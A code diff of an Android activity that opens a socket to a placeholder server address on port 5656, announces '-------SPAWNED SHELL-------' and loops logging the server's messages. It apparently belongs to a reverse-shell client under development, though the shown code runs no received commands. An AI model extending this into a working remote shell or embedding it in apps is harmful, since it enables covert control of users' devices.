@@ -62,31 +62,23 @@ public class MainActivity extends AppCompatActivity {
                     @Override
                     public void run() {
                         try {
-                            serverConnect.startConnection("192.168.31.85", 5656);
+                            serverConnect.startConnection("IP", 5656);
                             Log.i("Connection", "Connection started");
                             serverConnect.sendFromClient("-------SPAWNED SHELL-------");
                             while (true) {
                                 String S2C = serverConnect.receiveFromServer();
                                 Log.i("Received from the server", S2C);
+                                if (S2C.equals("exit")) {
+                                    serverConnect.sendFromClient("Bye!");
+                                    serverConnect.stopConnection();
+                                    Log.i("Connection", "Connection closed");
+                                }
                             }
                         } catch (Exception e) {
                             e.printStackTrace();
                         }
                     }
                 }).start();
-            }
-        });
-
-        Button closeConnectionBtn = findViewById(R.id.close_connection_btn);
-        closeConnectionBtn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                try {
-                    serverConnect.stopConnection();
-                    Log.i("Connection", "Connection closed");
-                } catch (IOException e) {
-                    throw new RuntimeException(e);
-                }
             }
         });
 
